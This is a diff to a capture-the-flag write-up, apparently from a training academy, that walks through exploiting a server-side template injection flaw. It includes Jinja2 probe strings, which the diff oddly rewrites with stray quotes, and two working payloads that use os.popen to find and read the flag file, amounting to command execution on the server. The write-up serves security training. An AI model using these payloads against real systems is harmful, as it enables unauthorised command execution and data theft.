@@ -27,7 +27,7 @@
 
 ### Solution 1 (Initial Attempt)
 1. Access website and test announcement field to see output 
-2. Follow payload tests to test for server side template injection vulnerability and uncover template engine (${7*7} -> {{7*7}} -> {{7*'7'}} -> Jinja2)
+2. Follow payload tests to test for server side template injection vulnerability and uncover template engine (${7'*'7} -> {{7'*'7}} -> {{7*'7'}} -> Jinja2)
 3. Submit following payload to locate flag {{ self.__init__.__globals__.__builtins__.__import__('os').popen('find / -name "*flag*" 2>/dev/null').read() }} -> file labeled /challenge/flag found
 4. Submit following payload -> {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /challenge/flag').read() }}
 5. Flag obtained -> academy{REDACTED}
